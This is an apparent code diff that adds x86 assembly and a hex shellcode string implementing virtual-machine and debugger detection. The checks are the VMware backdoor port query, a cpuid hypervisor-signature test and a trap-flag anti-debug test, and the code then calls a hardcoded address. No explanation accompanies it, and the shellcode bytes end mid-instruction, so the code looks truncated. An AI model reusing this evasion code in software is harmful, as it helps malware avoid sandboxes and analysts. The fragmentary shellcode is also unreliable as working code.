@@ -1,0 +1,17 @@
+mov eax, 0x564D5868 
+mov ecx,0x0a
+mov dx, 0x5658
+in eax,dx 
+cmp ebx, 0x564D5868  
+jnz popup
+push ss
+pop ss
+pushf
+test byte ptr [esp+1], 1
+jnz popup
+popf
+mov    eax,0x4094e4
+call   eax
+popup:
+//shellcode
+\x31\xC0\xB8\x00\x00\x00\x40\x0F\xA2\x81\xF9\x72\x65\x56\x4D\x74\x0E\x16\x17\x9C\xF6\x44\x24\x01\x01\x75\x03\x9D\xEB\x08\x9D\xB8
